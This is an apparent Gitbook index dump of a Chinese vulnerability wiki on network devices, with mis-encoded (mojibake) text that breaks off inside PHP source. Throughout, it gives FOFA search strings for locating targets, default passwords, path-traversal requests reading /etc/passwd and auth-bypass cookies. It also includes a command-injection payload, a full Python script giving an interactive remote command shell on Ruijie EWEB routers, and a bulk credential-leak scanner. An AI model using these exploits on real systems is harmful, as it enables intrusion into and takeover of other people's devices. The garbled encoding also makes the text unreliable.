å¯ä»¥è¿›å…¥åå°åæ›´æ”¹ä»»æ„ç”¨æˆ·æƒé™å‡çº§ä¸ºç®¡ç†å‘˜ æ¼æ´å½±å“ [!NOTE] å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ FOFA [!NOTE] title=\"å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™\" æ¼æ´å¤ç° ç™»å½•åå°åç®¡ç†ç•Œé¢ç‚¹å‡»ä¸‹é¢çš„å›¾æ ‡ æ›´æ”¹æƒé™ä¸ºä»»æ„ç”¨æˆ·,åˆ·æ–°åå¾—åˆ°ç”¨æˆ·æƒé™ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä½‘å‹/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä½‘å‹/","title":"ä½‘å‹","keywords":"","body":"ä½‘å‹ ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-20 14:15:21 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä½‘å‹/ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä½‘å‹/ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"ä½‘å‹é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ä½‘å‹é˜²ç«å¢™ åå°ç»´æŠ¤å·¥å…·å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œç”±äºæ²¡æœ‰è¿‡æ»¤å±é™©å­—ç¬¦ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] ä½‘å‹é˜²ç«å¢™ FOFA [!NOTE] title=\"ä½‘å‹é˜²ç«å¢™\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤è´¦å·å¯†ç ä¸º User: admin Pass: hicomadmin ç™»å½•åå° ç³»ç»Ÿç®¡ç† --> ç»´æŠ¤å·¥å…· --> Ping PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/åä¸º/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/åä¸º/","title":"åä¸º","keywords":"","body":"Huawei Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-17 22:49:53 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/åä¸º/Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/åä¸º/Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"Huawei HG659 lib ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° Huawei HG659 lib å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] Huawei HG659 FOFA [!NOTE] app=\"HUAWEI-Home-Gateway-HG659\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ POCå¦‚ä¸‹ /lib///....//....//....//....//....//....//....//....//etc//passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-17 22:49:06 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è¿ˆæ™®/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è¿ˆæ™®/","title":"è¿ˆæ™®","keywords":"","body":"è¿ˆæ™® è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-04 15:16:58 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è¿ˆæ™®/è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è¿ˆæ™®/è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´.html","title":"è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´","keywords":"","body":"è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ æ¼æ´æè¿° è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] è¿ˆæ™® ISG1000å®‰å…¨ç½‘å…³ FOFA [!NOTE] title=\"è¿ˆæ™®é€šä¿¡æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è¯·æ±‚çš„ POC ä¸º /webui/?g=sys_dia_data_down&file_name=../etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-04 15:39:26 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/","title":"é”æ·","keywords":"","body":"é”æ· é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´ é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2021-09650 é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ² CNVD-2021-14536 é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´ é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´ é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´ é”æ·EGæ˜“ç½‘å…³ branch_passw.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ é”æ·EGæ˜“ç½‘å…³ phpinfo.view.php ä¿¡æ¯æ³„éœ²æ¼æ´ é”æ·EGæ˜“ç½‘å…³ download.php åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ é”æ·ISG è´¦å·å¯†ç æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:17:46 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2021-09650.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2021-09650.html","title":"é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2021-09650","keywords":"","body":"é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2021-09650 æ¼æ´æè¿° é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿéƒ¨åˆ†æ¥å£å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å–æƒé™ æ¼æ´å½±å“ [!NOTE] é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ FOFA [!NOTE] title=\"é”æ·ç½‘ç»œ-EWEBç½‘ç®¡ç³»ç»Ÿ\" icon_hash=\"-692947551\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶åœ¨ /guest_auth/guestIsUp.php è¿™é‡Œçœ‹åˆ°é€šè¿‡å‘½ä»¤æ‹¼æ¥çš„æ–¹å¼æ„é€ å‘½ä»¤æ‰§è¡Œï¼Œ POST /guest_auth/guestIsUp.php mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt ç„¶åè®¿é—®é¡µé¢ /guest_auth/test.txt å°±å¯ä»¥çœ‹åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœ æ¼æ´åˆ©ç”¨POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·ç½‘ç»œ-EWEBç½‘ç®¡ç³»ç»Ÿ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| whoami > test_test.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´, æ‰§è¡Œå‘½ä»¤ whoami \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸ºï¼š {} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ç›®æ ‡ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1&ip=127.0.0.1| {} > test_test.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸ºï¼š \\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] é”æ·NBRè·¯ç”±å™¨ EWEBç½‘ç®¡ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 19:21:29 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ².html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ².html","title":"é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²","keywords":"","body":"é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ² CNVD-2021-14536 æ¼æ´æè¿° é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²,å¯ä»¥é—´æ¥è·å–ç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯ç™»å½•åå° å½±å“ç‰ˆæœ¬ [!NOTE] é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿ FOFA [!NOTE] title=\"RG-UACç™»å½•é¡µé¢\" æ¼æ´å¤ç° æ¥åˆ°ç™»å½•é¡µé¢ æŒ‰F12æŸ¥çœ‹æºç ,å¯ä»¥å‘ç°è´¦å·å’Œå¯†ç çš„md5å½¢å¼ è§£å¯†md5å¾—åˆ°å¯†ç åå³å¯ç™»å½•ç³»ç»Ÿ æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"super_admin\" in response.text and \"password\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,F12æŸ¥çœ‹æºç è·å–å¯†ç md5å€¼ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´.html","title":"é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´","keywords":"","body":"é”æ·SSL VPN è¶Šæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° Ruijie SSL VPN å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…åœ¨å·²çŸ¥ç”¨æˆ·åçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¹è´¦å·è¿›è¡Œä¿®æ”¹å¯†ç å’Œç»‘å®šæ‰‹æœºçš„æ“ä½œã€‚å¹¶åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æŸ¥çœ‹æœåŠ¡å™¨èµ„æº æ¼æ´å½±å“ [!NOTE] Ruijie SSL VPN FOFA [!NOTE] icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POCè¯·æ±‚åŒ…å¦‚ä¸‹ GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 å…¶ä¸­æ³¨æ„çš„å‚æ•°ä¸º Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName å‚æ•°ä¸ºå·²çŸ¥ç”¨æˆ·å [!NOTE] åœ¨æœªçŸ¥ç™»å½•ç”¨æˆ·åçš„æƒ…å†µä¸‹ æ¼æ´æ— æ³•åˆ©ç”¨(æ ¹æ®è¯·æ±‚åŒ…ä½¿ç”¨Burpè¿›è¡Œç”¨æˆ·åçˆ†ç ´) ç”¨æˆ·åæ­£ç¡®æ—¶ä¼šè¿”å›æ•æ„Ÿä¿¡æ¯ é€šè¿‡æ­¤æ–¹æ³•çŸ¥é“ç”¨æˆ·ååå¯ä»¥é€šè¿‡æ¼æ´ä¿®æ”¹è´¦å·å‚æ•° è®¿é—® http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres ç‚¹å‡»ä¸ªäººè®¾ç½®è·³è½¬é¡µé¢å³å¯ä¿®æ”¹è´¦å·ä¿¡æ¯ å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==&mid=2247484601&idx=1&sn=d6d6f4496243d98e688667faff137973 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´.html","title":"é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´","keywords":"","body":"é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´ CNVD-2020-56167 æ¼æ´æè¿° é”æ·Smartwebç®¡ç†ç³»ç»Ÿ é»˜è®¤å¼€å¯Guestè´¦æˆ·æ¼æ´ ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´ç™»å½•åå°è¿›ä¸€æ­¥æ”»å‡» æ¼æ´å½±å“ [!NOTE] é”æ·ç½‘ç»œè‚¡ä»½æœ‰é™å…¬å¸ æ— çº¿smartwebç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"æ— çº¿smartWeb--ç™»å½•é¡µé¢\" æ¼æ´å¤ç° ç™»å½•çš„è´¦å·å¯†ç ä¸º guest/guest Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Ruijie smartweb weak password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"é”æ·Smartwebç®¡ç†ç³»ç»Ÿ å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° é”æ·ç½‘ç»œè‚¡ä»½æœ‰é™å…¬å¸æ— çº¿smartwebç®¡ç†ç³»ç»Ÿå­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»æ¼æ´è·å–åˆ°ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œä»è€Œä»¥ç®¡ç†å‘˜æƒé™ç™»å½•ã€‚ æ¼æ´å½±å“ [!NOTE] é”æ·ç½‘ç»œè‚¡ä»½æœ‰é™å…¬å¸ æ— çº¿smartwebç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"æ— çº¿smartWeb--ç™»å½•é¡µé¢\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ é»˜è®¤å­˜åœ¨ guestè´¦æˆ·ï¼Œè´¦å·å¯†ç ä¸º guest/guest å…¶ä¸­ç™»å½•çš„è¿‡ç¨‹ä¸­æœç´¢adminçš„æ•°æ®åå‘ç°è¯·æ±‚äº†ä¸€ä¸ªæ–‡ä»¶ /web/xml/webuser-auth.xmlï¼Œè€Œä¸”å“åº”ä¸­åŒ…å«äº† adminå¯†ç çš„base64åŠ å¯† è§£å¯†å°±å¯ä»¥è·å¾— adminç®¡ç†å‘˜çš„å¯†ç ï¼Œå°è¯•ç›´æ¥è¯·æ±‚ http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml Cookieæ·»åŠ  Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest ç›´æ¥è·å¾—æ‰€æœ‰çš„è´¦æˆ·çš„ç­‰çº§æ ‡å¿—å’Œbase64åŠ å¯†çš„è´¦å·å¯†ç  Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Ruijie_smartweb_password_information_disclosure PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´.html","title":"é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´","keywords":"","body":"é”æ·äº‘è¯¾å ‚ä¸»æœº ç›®å½•éå†æ¼æ´ æ¼æ´æè¿° é”æ·äº‘è¯¾å ‚ä¸»æœºå­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œé€šè¿‡è®¿é—®getè¯·æ±‚/pool/ï¼Œå³å¯è¯»å–ç›®å½•.å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ². æ¼æ´å½±å“ [!NOTE] é”æ·äº‘è¯¾å ‚ FOFA [!NOTE] title=\"Ruijie\" && \"äº‘è¯¾å ‚ä¸»æœº\" æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/pool é€ æˆç›®å½•éå† PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é”æ·/é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"é”æ·EGæ˜“ç½‘å…³ cli.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° é”æ·EGæ˜“ç½‘å…³ cli.phpå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé…åˆ é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´ è¾¾åˆ°RCEæ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] é”æ·EGæ˜“ç½‘å…³ FOFA [!NOTE] app=\"Ruijie-EGæ˜“ç½‘å…³\" æ¼æ´å¤ç° é¦–å…ˆç™»å½•åˆ°åå°ä¸­(å¯ä»¥ç»„åˆ é”æ·EGæ˜“ç½‘å…³ ç®¡ç†å‘˜è´¦å·å¯†ç æ³„éœ²æ¼æ´) æ¼æ´æ–‡ä»¶ cli.php true, \"data\" => $content); json_echo($data); } /** * è·å–ç³»ç»Ÿæ—¶é—´ */ public function dateAction() { setTimeZone(); $data['status'] = true; $data[\"data\"][\"time\"] = date(\"Y-m-d H:i:s\"); $data[\"data\"][\"zone\"] = \"UTC\" . getTimeZone(); json_echo($data); } /** * è·å–ç³»ç»Ÿæ—¶åŒº */ public function datezoneAction() { $data['status'] = true; $data[\"data\"] = getTimeZone(); json_echo($data); } /** * æ£€æµ‹é™æ€é¡µé¢æ—¶å€™æœªç™»å½•ç›´æ¥è¿›å…¥ */ public function checkloginAction() { json_echo(array(\"status\" => 